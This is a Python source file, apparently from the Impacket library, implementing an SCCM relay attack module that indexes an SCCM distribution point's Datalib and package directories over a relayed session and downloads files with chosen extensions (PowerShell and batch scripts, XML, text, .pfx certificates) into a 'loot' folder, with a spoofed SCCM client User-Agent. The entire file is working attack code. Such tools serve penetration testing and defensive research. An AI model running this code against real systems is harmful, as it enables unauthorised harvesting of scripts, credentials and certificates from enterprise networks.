# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM relay attack to dump files from Distribution Points
# 
# Authors:
#    Quentin Roland(@croco_byte)
#    Based on SCCMSecrets.py (https://github.com/synacktiv/SCCMSecrets/)
#    Inspired by the initial pull request of Alberto Rodriguez (@__ar0d__)
#    Credits to @badsectorlabs for the datalib file indexing method

import os
import json
import urllib

from html.parser                                        import HTMLParser
from datetime                                           import datetime
from impacket                                           import LOG


def print_tree(d, out, prefix=""):
    keys = list(d.keys())
    for i, key in enumerate(keys):
        is_last = (i == len(keys) - 1)
        if isinstance(d[key], dict):
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}/\n")
            new_prefix = f"{prefix}{'    ' if is_last else '│   '}"
            print_tree(d[key], out, new_prefix)
        else:
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}\n")

class PackageIDsRetriever(HTMLParser):
    def __init__(self):
        super().__init__()
        self.package_ids = set()

    def handle_starttag(self, tag, attrs):
        if tag == 'a':
            for attr in attrs:
                if attr[0] == 'href':
                    href = attr[1]
                    parts = href.split('/')
                    last_part = parts[-1].strip()
                    if not last_part.endswith('.INI'):
                        self.package_ids.add(last_part)

class FileAndDirsRetriever(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []
        self.previous_data = ""

    def handle_starttag(self, tag, attrs):
        self.current_tag = tag
        if tag == 'a':
            href = dict(attrs).get('href')
            if href:
                self.links.append((href, self.previous_data))

    def handle_data(self, data):
        self.previous_data = data.strip()



class SCCMDPAttack:
    max_recursion_depth = 5
    DP_DOWNLOAD_HEADERS = {
            "User-Agent": "SMS CCM 5.0 TS"
    }

    def _run(self):
        LOG.info("Starting SCCM DP attack")

        distribution_point = f"{'https' if self.client.port == 443 else 'http'}://{self.client.host}"
        loot_dir = f"{self.client.host}_{datetime.now().strftime('%Y%m%d%H%M%S')}_sccm_dp_loot"
        if self.config.SCCMDPExtensions == None:
            self.config.SCCMDPExtensions = [".ps1", ".bat", ".xml", ".txt", ".pfx"]
        elif not self.config.SCCMDPExtensions.strip():
            self.config.SCCMDPExtensions = []
        else:
            self.config.SCCMDPExtensions = [x.strip() for x in self.config.SCCMDPExtensions.split(',')]

        try:
            os.makedirs(loot_dir, exist_ok=True)
            LOG.info(f"Loot directory is: {loot_dir}")
        except Exception as err:
            LOG.error(f"Error creating base output directory: {err}")
            return


        # If a set of URLs was provided or an existing index file, do not reindex
        if self.config.SCCMDPFiles is None and self.config.SCCMDPIndexfile is None:
            try:
                LOG.debug("Performing file indexing from Datalib")
                self.fetchPackageIDsFromDatalib(distribution_point, loot_dir)
                LOG.info("File indexing from Datalib performed")
            except Exception as e:
                LOG.error(f"Encountered an error while indexing files from Distribution Point: {e}")
                return

        try:
            LOG.debug("Performing file download")
            self.downloadTargetFiles(loot_dir, self.config.SCCMDPExtensions, self.config.SCCMDPIndexfile, self.config.SCCMDPFiles)
            LOG.info("File download performed")
        except Exception as e:
            LOG.error(f"Encountered an error while downloading target files: {e}")
            return
        
        LOG.info(f"DONE - attack finished. Check loot directory {loot_dir}")




    def recursiveFileExtract(self, data, extensions):
        to_download = []
        if isinstance(data, dict):
            for key, value in data.items():
                if value is None and key.endswith(tuple(extensions)):
                    to_download.append(key)
                else:
                    to_download.extend(self.recursiveFileExtract(data[key], extensions))
        return to_download
    
    def downloadFiles(self, loot_dir, package, files):
        for file in files:
            try:
                parsed_url = urllib.parse.urlparse(file)
                filename = urllib.parse.unquote(parsed_url.path.split('/')[-1])
                self.client.request("GET", file, headers=self.DP_DOWNLOAD_HEADERS)
                r = self.client.getresponse().read()
                output_file = f"{loot_dir}/{filename}"
                with open(output_file, 'wb') as f:
                    f.write(r)
                LOG.info(f"Package {package} - downloaded file {filename}")
            except Exception as e:
                LOG.error(f"[!] Error when handling package {file}")
                LOG.error(f"{e}")


    def downloadTargetFiles(self, loot_dir, extensions, index_file, files):
        if files is not None:
            with open(files, 'r') as f:
                to_download = f.read().splitlines()
                os.makedirs(f'{loot_dir}/files')
                self.downloadFiles(f'{loot_dir}/files', 'N/A', to_download)
        else:
            if index_file is not None:
                with open(index_file, 'r') as f:
                    content = json.loads(f.read())
            else:
                with open(f'{loot_dir}/index.json', 'r') as f:
                    content = json.loads(f.read())
            for key, value in content.items():
                to_download = self.recursiveFileExtract(value, extensions)
                if len(to_download) == 0:
                    continue
                if not os.path.exists(f'{loot_dir}/{key}'):
                    os.makedirs(f'{loot_dir}/{key}')

                self.downloadFiles(f'{loot_dir}/{key}', key, to_download)


    def recursivePackageDirectoryFetch(self, object, directory, depth):
        depth += 1

        self.client.request("GET", directory, headers=self.DP_DOWNLOAD_HEADERS)
        r = self.client.getresponse().read()

        parser = FileAndDirsRetriever()
        parser.feed(r.decode())
        
        files = []
        for href in parser.links:
            if '<dir>' in href[1]:
                if depth <= self.max_recursion_depth:
                    object[href[0]] = {}
                    self.recursivePackageDirectoryFetch(object[href[0]], href[0], depth)
                else:
                    object[href[0]] = "Maximum recursion depth reached"
            else:
                files.append(href[0])
        for file in files:
            object[file] = None


    def fetchPackageIDsFromDatalib(self, distribution_point, loot_dir):
        package_ids = set()
        self.client.request("GET", f"{distribution_point}/sms_dp_smspkg$/Datalib", headers=self.DP_DOWNLOAD_HEADERS)
        r = self.client.getresponse().read()
        packageIDs_parser = PackageIDsRetriever()
        packageIDs_parser.feed(r.decode())
        package_ids = packageIDs_parser.package_ids

            
        LOG.info(f"Found {len(package_ids)} packages")
        LOG.debug(package_ids)

        results = {}
        for package_id in package_ids:
            fileDir_parser = FileAndDirsRetriever()
            self.client.request("GET", f"{distribution_point}/sms_dp_smspkg$/{package_id}", headers=self.DP_DOWNLOAD_HEADERS)
            r = self.client.getresponse().read()
            fileDir_parser.feed(r.decode())

            files = []
            directories = []
            for href in fileDir_parser.links:
                if '<dir>' in href[1]:
                    directories.append(href[0])
                else:
                    files.append(href[0])

            results[package_id] = {}
            for directory in directories:
                results[package_id][directory] = {}
            for file in files:
                results[package_id][file] = None
        
        for package in results.keys():
            for item in results[package].keys():
                if isinstance(results[package][item], dict):
                    self.recursivePackageDirectoryFetch(results[package][item], item, 0)
        
        with open(f'{loot_dir}/index.json', 'w') as f:
            f.write(json.dumps(results))
        with open(f'{loot_dir}/index.txt', 'w') as out:
            print_tree(results, out)